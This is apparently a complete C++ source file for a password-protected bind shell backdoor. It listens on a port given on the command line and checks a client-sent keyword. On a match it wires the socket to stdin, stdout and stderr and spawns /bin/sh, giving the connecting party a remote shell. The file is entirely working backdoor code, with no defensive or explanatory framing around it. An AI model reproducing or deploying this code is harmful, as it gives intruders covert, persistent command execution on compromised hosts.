#include <string>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <syslog.h>
#include <signal.h>
#include <errno.h>

#define MAX_PASS_LEN 256

char *keyword;
char *password;
char *newargv[2];

using namespace std;

int is = 1;
int sock, sock1 = 0;

void sig_int(int sig_no)
{
    printf("\nsignal\n");
    if (sock1 != 0)
	close(sock1);
    close(sock);
    delete[] newargv[0];
    delete[] password;
    exit(0);
}

int main(int argc, char* argv[], char* envp[])
{
    keyword = argv[1];
    struct sockaddr_in addr, peer_addr;
    socklen_t peer_addr_size;
    int pid;
    int len;
    password = new char[MAX_PASS_LEN];
    char *p;
    newargv[0] = new char[8];
    strcpy(newargv[0], "/bin/sh");
    newargv[1] = NULL;

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        perror("socket()");
        return 1;
    }
    printf("created\n");

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(atoi(argv[2]));

    signal(SIGINT, sig_int);

    if (bind(sock, (struct sockaddr*)&addr, sizeof(struct sockaddr_in)) == -1)
    {
        fprintf(stderr, "%d \n", errno);
        perror("bind()");
        return 0;
    }
    printf("bound\n");

    while(listen(sock, 2) != -1)
    {
        printf("listened\n");
        peer_addr_size = sizeof(addr);
        sock1 = accept(sock, (struct sockaddr *) &peer_addr, &peer_addr_size);
        printf("accepted\n");
        pid = fork();
        if (pid == -1)
        {
            printf("error fork\n");
            close(sock1);
            break;
        }
        else if (pid == 0)
        {
            p = password;
            len = 0;
            while ( len < MAX_PASS_LEN && recv(sock1, p, 1, 0) == 1 && *p != '\r' && *p != '\n' && *p != '\0')
            {
                ++p;
                ++len;
            }
            *p = '\0';
            if (strcmp(password, keyword) != 0 )
            {
                printf("%s != %s\n", password, keyword);
                exit(0);
            }
            if (dup2(sock1, 0) == -1 )
            {
                printf("error dup2 0\n");
                close(sock1);
                break;
            }
            if (dup2(sock1, 1) == -1 )
            {
                printf("error dup2 1\n");
                close(sock1);
                break;
            }
            if (dup2(sock1, 2) == -1 )
            {
                printf("error dup2 2\n");
                close(sock1);
                break;
            }
            execve("/bin/sh", newargv, envp);
        }
        else
        {
            waitpid(pid, NULL, 0);
        }
        close(sock1);
        sock1 = 0;
    }
    printf("listening error\n");
    delete[] newargv[0];
    delete[] password;
    close(sock);
    return 0;

   return 0;
}
